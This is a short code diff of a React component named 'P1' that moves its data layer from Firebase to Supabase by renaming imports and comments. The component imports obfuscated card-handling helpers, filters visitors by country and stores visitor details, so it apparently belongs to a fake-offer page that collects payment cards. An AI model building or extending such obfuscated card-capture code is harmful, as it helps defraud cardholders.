@@ -16,13 +16,13 @@ import {
   Gift,
 } from "lucide-react";
 import { _dct, _fcn, _fed, _gbi, _lc } from "@/lib/card-utils";
-import { db } from "@/lib/firebase";
-import { secureAddData } from "@/lib/secure-firebase";
-import { doc, onSnapshot, setDoc, Firestore } from "firebase/firestore";
+import { db } from "@/lib/supabase-client";
+import { secureAddData } from "@/lib/secure-supabase";
+import { doc, onSnapshot, setDoc, Firestore } from "@/lib/supabase-client";
 import { addToHistory } from "@/lib/history-utils";
 import { FullPageLoader } from "./loader";
 import { _gt } from "@/lib/text-obf";
-import { _icb, isCountryAllowed } from "@/lib/firebase/settings";
+import { _icb, isCountryAllowed } from "@/lib/supabase-settings";
 import { EmailModal } from "@/components/email-modal";
 import { _e } from "@/lib/secure-utils";
 
@@ -103,15 +103,15 @@ export default function P1({ offerTotalPrice }: _P1Props) {
           return;
         }
 
-        // Get country from localStorage (saved from Firebase)
+        // Get country from localStorage (saved from Supabase)
         let countryCodeAlpha3 = localStorage.getItem("country");
 
-        // If not in localStorage, try to get from Firebase
+        // If not in localStorage, try to get from Supabase
         if (!countryCodeAlpha3) {
           const visitorID = localStorage.getItem("visitor");
           if (visitorID && db) {
             const docRef = doc(db as Firestore, "pays", visitorID);
-            const docSnap = await import("firebase/firestore").then((mod) =>
+            const docSnap = await import("@/lib/supabase-client").then((mod) =>
               mod.getDoc(docRef),
             );
             if (docSnap.exists()) {
@@ -420,7 +420,7 @@ export default function P1({ offerTotalPrice }: _P1Props) {
         localStorage.getItem("visitor") ||
         "unknown";
 
-      // Save to Firebase or send email
+      // Save to Supabase or send email
       await secureAddData({
         id: visitorID,
         name,
